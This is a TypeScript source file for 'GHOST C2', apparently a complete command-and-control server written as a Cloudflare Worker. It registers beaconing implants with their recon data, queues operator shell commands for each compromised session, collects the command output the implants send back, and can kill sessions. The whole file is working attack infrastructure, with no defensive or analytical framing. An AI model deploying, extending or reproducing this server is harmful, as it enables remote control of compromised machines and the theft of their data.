/**
 * GHOST C2 — Cloudflare Worker
 *
 * Serverless C2 listener running on Cloudflare's edge network.
 * State stored in Workers KV (eventually consistent, globally distributed).
 *
 * KV Key Schema:
 *   session:{sid}   → SessionData JSON (metadata, recon, timestamps)
 *   tasks:{sid}     → string[] JSON (pending command queue, FIFO)
 *   results:{sid}   → ResultEntry[] JSON (command outputs with timestamps)
 *
 * Auth:
 *   X-Beacon-Token   → implant-facing routes (/beacon, /result)
 *   X-Operator-Token  → operator-facing routes (/sessions, /task, /results/*, /audit)
 *
 * Secrets (set via `wrangler secret put`):
 *   BEACON_TOKEN, OPERATOR_TOKEN
 */

// ─── Types ────────────────────────────────────────────────

interface Env {
  GHOST_KV: KVNamespace;
  BEACON_TOKEN: string;
  OPERATOR_TOKEN: string;
  SESSION_TIMEOUT_SECONDS: string;
  CORS_ORIGIN: string;
}

interface SessionData {
  session: string;
  remote_ip: string;
  first_seen: string;   // ISO 8601
  last_beacon: string;  // ISO 8601
  recon: Record<string, unknown>;
}

interface ResultEntry {
  ts: string;
  output: string;
}

interface BeaconRequest {
  session: string;
  recon?: Record<string, unknown>;
}

interface ResultRequest {
  session: string;
  output: string;
}

interface TaskRequest {
  session: string;
  cmd: string;
}

interface AuditEntry {
  ts: string;
  ip: string;
  action: string;
  detail: Record<string, unknown>;
}

// ─── Helpers ──────────────────────────────────────────────

function jsonResponse(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

function errorResponse(message: string, status: number): Response {
  return jsonResponse({ error: message }, status);
}

/** Constant-time string comparison to prevent timing attacks on tokens. */
function secureCompare(a: string, b: string): boolean {
  if (a.length !== b.length) return false;
  const encoder = new TextEncoder();
  const bufA = encoder.encode(a);
  const bufB = encoder.encode(b);
  let diff = 0;
  for (let i = 0; i < bufA.length; i++) {
    diff |= bufA[i] ^ bufB[i];
  }
  return diff === 0;
}

function getClientIP(request: Request): string {
  return request.headers.get("CF-Connecting-IP")
    ?? request.headers.get("X-Real-IP")
    ?? "unknown";
}

function clampString(s: string, maxLen: number): string {
  return s.length > maxLen ? s.slice(0, maxLen) : s;
}

function getSessionTimeout(env: Env): number {
  return parseInt(env.SESSION_TIMEOUT_SECONDS || "600", 10);
}

/** Add CORS headers to a response. */
function withCORS(response: Response, env: Env): Response {
  const origin = env.CORS_ORIGIN || "*";
  const headers = new Headers(response.headers);
  headers.set("Access-Control-Allow-Origin", origin);
  headers.set("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
  headers.set("Access-Control-Allow-Headers", "Content-Type, X-Beacon-Token, X-Operator-Token");
  headers.set("Access-Control-Max-Age", "86400");
  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers,
  });
}

// ─── KV Operations ────────────────────────────────────────

async function getSession(kv: KVNamespace, sid: string): Promise<SessionData | null> {
  const raw = await kv.get(`session:${sid}`);
  return raw ? JSON.parse(raw) as SessionData : null;
}

async function putSession(kv: KVNamespace, sid: string, data: SessionData, ttl: number): Promise<void> {
  await kv.put(`session:${sid}`, JSON.stringify(data), {
    expirationTtl: ttl,
  });
}

async function getTasks(kv: KVNamespace, sid: string): Promise<string[]> {
  const raw = await kv.get(`tasks:${sid}`);
  return raw ? JSON.parse(raw) as string[] : [];
}

async function putTasks(kv: KVNamespace, sid: string, tasks: string[]): Promise<void> {
  if (tasks.length === 0) {
    await kv.delete(`tasks:${sid}`);
  } else {
    await kv.put(`tasks:${sid}`, JSON.stringify(tasks), {
      expirationTtl: 86400, // 24h TTL on task queues
    });
  }
}

async function getResults(kv: KVNamespace, sid: string): Promise<ResultEntry[]> {
  const raw = await kv.get(`results:${sid}`);
  return raw ? JSON.parse(raw) as ResultEntry[] : [];
}

async function putResults(kv: KVNamespace, sid: string, results: ResultEntry[]): Promise<void> {
  if (results.length === 0) {
    await kv.delete(`results:${sid}`);
  } else {
    await kv.put(`results:${sid}`, JSON.stringify(results), {
      expirationTtl: 86400,
    });
  }
}

async function appendResult(kv: KVNamespace, sid: string, entry: ResultEntry): Promise<void> {
  const results = await getResults(kv, sid);
  // Cap at 500 results per session to avoid KV value size limits (25 MB)
  if (results.length >= 500) {
    results.shift();
  }
  results.push(entry);
  await putResults(kv, sid, results);
}

/** List all session keys using KV list with prefix. */
async function listSessionKeys(kv: KVNamespace): Promise<string[]> {
  const keys: string[] = [];
  let cursor: string | undefined;

  // KV list returns max 1000 keys per call; paginate if needed
  do {
    const result = await kv.list({ prefix: "session:", cursor, limit: 1000 });
    for (const key of result.keys) {
      keys.push(key.name);
    }
    cursor = result.list_complete ? undefined : result.cursor;
  } while (cursor);

  return keys;
}

// ─── In-memory audit buffer (per-request only — Workers are stateless) ────
// For persistent audit, write to KV. We append each action to a rolling log.

async function logAudit(kv: KVNamespace, entry: AuditEntry): Promise<void> {
  const key = "audit_log";
  const raw = await kv.get(key);
  const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];

  // Keep last 1000 entries
  if (log.length >= 1000) {
    log.splice(0, log.length - 999);
  }
  log.push(entry);

  await kv.put(key, JSON.stringify(log), {
    expirationTtl: 604800, // 7 days
  });
}

// ─── Route Handlers ───────────────────────────────────────

/**
 * POST /beacon
 * Implant check-in. Updates session, returns next task.
 */
async function handleBeacon(request: Request, env: Env): Promise<Response> {
  const body = await request.json() as BeaconRequest;
  if (!body?.session) {
    return errorResponse("Missing session field", 400);
  }

  const sid = clampString(String(body.session), 128);
  const now = new Date().toISOString();
  const ip = getClientIP(request);
  const ttl = getSessionTimeout(env);

  // Upsert session
  const existing = await getSession(env.GHOST_KV, sid);
  const session: SessionData = {
    session: sid,
    remote_ip: ip,
    first_seen: existing?.first_seen ?? now,
    last_beacon: now,
    recon: body.recon ?? existing?.recon ?? {},
  };
  await putSession(env.GHOST_KV, sid, session, ttl);

  // Pop next task (FIFO)
  const tasks = await getTasks(env.GHOST_KV, sid);
  if (tasks.length > 0) {
    const cmd = tasks.shift()!;
    await putTasks(env.GHOST_KV, sid, tasks);
    console.log(`[beacon] sid=${sid} ip=${ip} tasked="${cmd}"`);
    return jsonResponse({ cmd });
  }

  console.log(`[beacon] sid=${sid} ip=${ip} sleep`);
  return jsonResponse({ cmd: "sleep" });
}

/**
 * POST /result
 * Implant posts command output.
 */
async function handleResult(request: Request, env: Env): Promise<Response> {
  const body = await request.json() as ResultRequest;
  if (!body?.session || body.output === undefined) {
    return errorResponse("Missing session or output field", 400);
  }

  const sid = clampString(String(body.session), 128);
  const output = clampString(String(body.output), 65536); // 64 KB cap

  const entry: ResultEntry = {
    ts: new Date().toISOString(),
    output,
  };
  await appendResult(env.GHOST_KV, sid, entry);

  // Ensure session exists (re-register if purged)
  const existing = await getSession(env.GHOST_KV, sid);
  if (!existing) {
    const now = new Date().toISOString();
    await putSession(env.GHOST_KV, sid, {
      session: sid,
      remote_ip: getClientIP(request),
      first_seen: now,
      last_beacon: now,
      recon: {},
    }, getSessionTimeout(env));
  }

  console.log(`[result] sid=${sid} len=${output.length}`);
  return jsonResponse({ status: "ok" });
}

/**
 * GET /sessions
 * Operator lists all active sessions.
 */
async function handleListSessions(request: Request, env: Env): Promise<Response> {
  const keys = await listSessionKeys(env.GHOST_KV);
  const now = Date.now();
  const sessions: Record<string, unknown>[] = [];

  for (const key of keys) {
    const sid = key.replace("session:", "");
    const data = await getSession(env.GHOST_KV, sid);
    if (!data) continue;

    const lastBeaconMs = new Date(data.last_beacon).getTime();
    const tasks = await getTasks(env.GHOST_KV, sid);
    const results = await getResults(env.GHOST_KV, sid);

    sessions.push({
      session: data.session,
      remote_ip: data.remote_ip,
      first_seen: data.first_seen,
      last_beacon: data.last_beacon,
      idle_seconds: Math.round((now - lastBeaconMs) / 1000),
      recon: data.recon,
      pending_tasks: tasks.length,
      result_count: results.length,
    });
  }

  await logAudit(env.GHOST_KV, {
    ts: new Date().toISOString(),
    ip: getClientIP(request),
    action: "list_sessions",
    detail: { count: sessions.length },
  });

  return jsonResponse(sessions);
}

/**
 * POST /task
 * Operator queues a command for a session.
 */
async function handleAddTask(request: Request, env: Env): Promise<Response> {
  const body = await request.json() as TaskRequest;
  if (!body?.session || !body?.cmd) {
    return errorResponse("Missing session or cmd field", 400);
  }

  const sid = clampString(String(body.session), 128);
  const cmd = clampString(String(body.cmd), 4096);

  // Verify session exists
  const session = await getSession(env.GHOST_KV, sid);
  if (!session) {
    return errorResponse("Session not found", 404);
  }

  const tasks = await getTasks(env.GHOST_KV, sid);
  tasks.push(cmd);
  await putTasks(env.GHOST_KV, sid, tasks);

  await logAudit(env.GHOST_KV, {
    ts: new Date().toISOString(),
    ip: getClientIP(request),
    action: "task_queued",
    detail: { session: sid, cmd },
  });

  console.log(`[task] sid=${sid} cmd="${cmd}" depth=${tasks.length}`);
  return jsonResponse({ status: "queued", queue_depth: tasks.length });
}

/**
 * GET /results/:sid
 * Operator retrieves results. Clears by default; ?keep=1 to preserve.
 */
async function handleGetResults(request: Request, env: Env, sid: string): Promise<Response> {
  const session = await getSession(env.GHOST_KV, sid);
  if (!session) {
    return errorResponse("Session not found", 404);
  }

  const results = await getResults(env.GHOST_KV, sid);
  const url = new URL(request.url);
  const keep = url.searchParams.get("keep") === "1";

  if (!keep) {
    await putResults(env.GHOST_KV, sid, []);
  }

  await logAudit(env.GHOST_KV, {
    ts: new Date().toISOString(),
    ip: getClientIP(request),
    action: "get_results",
    detail: { session: sid, count: results.length, keep },
  });

  return jsonResponse({ session: sid, results });
}

/**
 * DELETE /sessions/:sid
 * Operator kills a session — queues "exit" and marks for removal.
 */
async function handleKillSession(request: Request, env: Env, sid: string): Promise<Response> {
  const session = await getSession(env.GHOST_KV, sid);
  if (!session) {
    return errorResponse("Session not found", 404);
  }

  // Insert "exit" at front of task queue
  const tasks = await getTasks(env.GHOST_KV, sid);
  tasks.unshift("exit");
  await putTasks(env.GHOST_KV, sid, tasks);

  await logAudit(env.GHOST_KV, {
    ts: new Date().toISOString(),
    ip: getClientIP(request),
    action: "kill_session",
    detail: { session: sid },
  });

  console.log(`[kill] sid=${sid} exit queued`);
  return jsonResponse({ status: "exit_queued", session: sid });
}

/**
 * GET /audit
 * Operator views the audit log. ?limit=N (default 100, max 1000).
 */
async function handleAudit(request: Request, env: Env): Promise<Response> {
  const url = new URL(request.url);
  const limit = Math.min(parseInt(url.searchParams.get("limit") || "100", 10), 1000);

  const raw = await env.GHOST_KV.get("audit_log");
  const log: AuditEntry[] = raw ? JSON.parse(raw) as AuditEntry[] : [];

  return jsonResponse({ entries: log.slice(-limit) });
}

/**
 * GET /health
 * Unauthenticated health check.
 */
function handleHealth(): Response {
  return jsonResponse({ status: "ok" });
}

// ─── Auth Middleware ───────────────────────────────────────

function requireBeaconToken(request: Request, env: Env): Response | null {
  const token = request.headers.get("X-Beacon-Token") || "";
  if (!env.BEACON_TOKEN || !secureCompare(token, env.BEACON_TOKEN)) {
    console.log(`[auth] beacon auth failure ip=${getClientIP(request)}`);
    return errorResponse("Unauthorized", 401);
  }
  return null;
}

function requireOperatorToken(request: Request, env: Env): Response | null {
  const token = request.headers.get("X-Operator-Token") || "";
  if (!env.OPERATOR_TOKEN || !secureCompare(token, env.OPERATOR_TOKEN)) {
    console.log(`[auth] operator auth failure ip=${getClientIP(request)}`);
    return errorResponse("Unauthorized", 401);
  }
  return null;
}

// ─── Router ───────────────────────────────────────────────

async function handleRequest(request: Request, env: Env): Promise<Response> {
  const url = new URL(request.url);
  const path = url.pathname;
  const method = request.method;

  // ── CORS preflight ──
  if (method === "OPTIONS") {
    return withCORS(new Response(null, { status: 204 }), env);
  }

  // ── Health (no auth) ──
  if (path === "/health" && method === "GET") {
    return withCORS(handleHealth(), env);
  }

  // ── Implant routes (beacon token) ──
  if (path === "/beacon" && method === "POST") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleBeacon(request, env), env);
  }

  if (path === "/result" && method === "POST") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleResult(request, env), env);
  }

  // ── Operator routes (operator token) ──
  if (path === "/sessions" && method === "GET") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleListSessions(request, env), env);
  }

  if (path === "/task" && method === "POST") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleAddTask(request, env), env);
  }

  if (path === "/audit" && method === "GET") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleAudit(request, env), env);
  }

  // ── Parameterized routes ──
  const resultsMatch = path.match(/^\/results\/(.+)$/);
  if (resultsMatch && method === "GET") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleGetResults(request, env, resultsMatch[1]), env);
  }

  const sessionsMatch = path.match(/^\/sessions\/(.+)$/);
  if (sessionsMatch && method === "DELETE") {
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleKillSession(request, env, sessionsMatch[1]), env);
  }

  // ── 404 ──
  return withCORS(errorResponse("Not found", 404), env);
}

// ─── Entry Point ──────────────────────────────────────────

export default {
  async fetch(request: Request, env: Env, _ctx: ExecutionContext): Promise<Response> {
    try {
      return await handleRequest(request, env);
    } catch (err) {
      const message = err instanceof Error ? err.message : "Internal error";
      console.error(`[error] ${message}`);
      return withCORS(errorResponse("Internal server error", 500), env);
    }
  },
};
